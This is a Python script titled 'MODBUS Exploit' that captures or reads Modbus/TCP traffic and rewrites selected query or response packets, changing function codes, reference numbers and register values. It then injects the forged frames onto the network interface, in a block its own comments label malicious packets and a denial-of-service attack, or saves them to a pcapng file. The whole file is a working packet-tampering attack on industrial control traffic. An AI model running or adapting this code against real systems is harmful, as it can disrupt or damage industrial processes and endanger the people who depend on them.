# Imports 
import os, sys, datetime, inspect, struct, time, argparse, pyshark
from time import sleep
from scapy.layers.l2 import Ether, Dot1Q


from scapy.all import *
from scapy.layers.inet import IP, TCP


# network choice and filter
networkInterface = "eth1"
filter_string = "ether proto 0x0800"
Modbus_TYPE = 0x0800


# Use argparse to parse the command line arguments
if len(sys.argv) < 2:
    print('[-] For help menu, use -h')
    sys.exit(1)

less_indent_formatter = lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=8)

parser = argparse.ArgumentParser(description='\t ###################### \n \t ### MODBUS Exploit ### \n \t ######################  By S.M..', formatter_class=less_indent_formatter, usage='python3 %(prog)s [options]')
parser.add_argument('--pcapfile', help='Name of the PCAP file to process.')
parser.add_argument('--livecapture', action='store_true', help='Start the live capture. (default: %(default)s)')
parser.add_argument('--store', help=""" Name the file to store the captured packets (should be with .pcap extension).""")
parser.add_argument('--output', help="""Name of the output file to save modified packets (should be with .pcap extension).
Some Examples: 
----------
For live capture: 
    python3 %(prog)s --livecapture --store <filename>
Read from pcap file:
    python3 %(prog)s --pcapfile <filename> 
    
    
""")
args = parser.parse_args()



####  DEFINED FUNCTIONS   ####


# Check for Modbus packets
def modbus_check(pkt):
    is_modbus = False
    if pkt.haslayer(Ether): 
        if pkt[Ether].type == Modbus_TYPE: is_modbus = True
    if pkt.haslayer(Dot1Q):
        if pkt[Dot1Q].type == Modbus_TYPE: is_modbus = True
    return is_modbus



# Filter packets based on the src and dst IP addresses
def filter_packets(packet, src_ip, dst_ip):
    if packet.haslayer(IP):
        if packet[IP].src == src_ip and packet[IP].dst == dst_ip:
            return True
    return False


####  INTERACTIVE PART  #####


# Read the given pcap file
if args.pcapfile:
    packets = rdpcap(args.pcapfile)
    print("\n[+] Reading pcap file... "); sleep(1)


# Live capture the packets from a live network
if args.livecapture:
    try:
        print(f"[+] Listening on {networkInterface}"); sleep(1)
        print("[+] YOU SHOULD HAVE SUDO PERMISSIONS TO DO THIS")
        count = int(input('How many packets do you want to capture?: '))
        print("[+] Capturing packets...")
        captureLive = pyshark.LiveCapture(
                interface=networkInterface, 
                bpf_filter=filter_string,
                output_file=args.store
        )

        #captureLive.set_debug()
        captureLive.sniff(packet_count=count)
        captureLive.close()
        print("[+] Capturing done..")
        print("[+] Using the pcap file just captured..")
        packets = rdpcap(args.store)

    except KeyboardInterrupt:
        print('\n[-] Exiting')
        sys.exit(1)


print("[+] Filtering Modbus packets... "); sleep(1)





# Store Data
modbus_packets = []                 #  to store the Modbus packets
unique_modbus_packets = set()       #  to store the Modbus packets for specific src and dst IP addresses


# Extract the Modbus packets
for packet in packets:
    if modbus_check(packet):
        # Add only modbus packets to the list
        modbus_packets.append(packet)
        
        # Add unique source and destination IP addresses to the set
        unique_modbus_packets.add((packet[IP].src, packet[IP].dst))



# Printing a sample packet

perm = input("Do you want to print a sample Modbus packet?[Y/N]: ")
sample = modbus_packets[0]
try:
    if perm in ['y', 'Y']:
        print("\n[+] Printing the sample Modbus packet..."); sleep(1)
        print(sample.show())
        print("\n")
        
    else:
        print("Okay then moving on..."); sleep(1)
        exit(1)

except KeyboardInterrupt:
    print('[-] Exiting')

####

print("Which type of packet do you want to modify? \n 1. Query \n 2. Response")
pkt_type = int(input("Choose : "))


#### FILTERING THE PACKETS #### 

# Convert set of unique addresses to a list and print it
unique_addresses_list = list(unique_modbus_packets)

print("\n[+] Scaning for unique source-destination IP connections..."); sleep(1)
print("Unique source and destination IP addresses:")
for i, (src, dst) in enumerate(unique_addresses_list):
    print(f"{i+1}. Source: {src} --> Destination: {dst}")
   
print('\n') 
print(f" Make sure the selected (src -> dst) pair should match the packet type selected above! ")
target = int(input("Choose the index:  "))
print('\n') 
sleep(1)

if 1 <= target <= len(unique_addresses_list):   
    src, dst = unique_addresses_list[target-1]
    print(f"Selected source IP address: {src}")
    print(f"Selected destination IP address: {dst}")
    print('\n') 

else:
    print("Invalid input!")
    exit(1)
    
    
filtered_packets = [packet for packet in modbus_packets if filter_packets(packet, src, dst)]



## Selecting the packets to modify
print(f"[+] Select the packets you want to manipulate in the range of 0 to {len(filtered_packets)}.")
opt = int(input("What do you want to manipulate?\n1. Range\n2. Some packets\nChoose the option: "))

if opt == 1:
    start = int(input("Enter the start index: "))
    end = int(input("Enter the end index: "))
    packets_to_modify = filtered_packets[start:end]

elif opt == 2:
    print("Enter the indexes of the packets you want to modify: ")
    indexes = list(map(int, input().split()))
    packets_to_modify = [filtered_packets[i] for i in indexes]
    
else:
    print("Invalid input!")
    print('[-] Exiting')
    exit(1)



############ Manipulating the packets #############

mod_packets = packets_to_modify.copy()

pkt = packets_to_modify[0]


if pkt_type == 1:
    print("\n[+] Modifying the Query packets..."); sleep(1)
    print("\n[+] Modifying the function code..."); sleep(1)
    print("\n[+] Modifying the reference number..."); sleep(1)
    
    
    for packet in mod_packets:
        raw_bytes = bytearray(packet[Raw].load)
        
        # Modifying the function code
        raw_bytes[7] = 0x02
        
        # Modify the reference number (last -4, -2 bytes)
        raw_bytes[-4:-2] = b'\x00\x09' 
        
        
        packet[Raw].load = bytes(raw_bytes)
        
        # Recalculate checksums
        del packet[TCP].chksum
        del packet[IP].chksum
    

    
elif pkt_type == 2:
    print("\n[+] Modifying the Response packets..."); sleep(1)
    print("\n[+] Modifying the function code..."); sleep(1)
    print("\n[+] Modifying the register value..."); sleep(1)
    
    for packet in mod_packets:
        raw_bytes = bytearray(packet[Raw].load)
        
        # Modifying the function code
        raw_bytes[7] = 0x06
        
        # Modify the register value    (last 2 bytes)
        raw_bytes[-2:] = b'\x00\x01'
        
        packet[Raw].load = bytes(raw_bytes)
        
        # Recalculate checksums
        del packet[TCP].chksum
        del packet[IP].chksum
    
    
else:
    print("Invalid input!")
    print('[-] Exiting')
    exit(1)
    

## SENDING/INJECTING OR SAVING THE MALICIOUS PACKETS ##
attack_choice = input("Do you want to send the modified packets? [Y/N]: ")
if attack_choice in ['y', 'Y']:
    try:
        # SENDING THE FRAMES AT HIGH FREQUENCY   ==> DOS ATTACK
        print('[+] Sending malicious packets...')

        for mod_packet in mod_packets:
            sendp(mod_packet, iface=networkInterface)          
            sleep(0.5)
            
    except KeyboardInterrupt:
        print("[-] Stopping the injection...")

elif attack_choice in ['n', 'N']:
    save_choice = input("Do you want to save the modified packets to a file? [Y/N]: ")
    if save_choice in ['y', 'Y']:
        f_name = input("Set filename: ")
        f_name = f_name + ".pcapng"
        try:
            print('[+] Saving the modified packets in pcapng file..')
            for mod_packet in packets_to_modify:
                wrpcap(f_name, mod_packet, append=True)
            print(f"Successfully saved pcapng file as {f_name} !")
            print("\n\n")

        except KeyboardInterrupt:
            print("[-] Exiting!")
    else:
        print("No action taken on modified packets.")
        exit(0)


print("[+] Exiting...")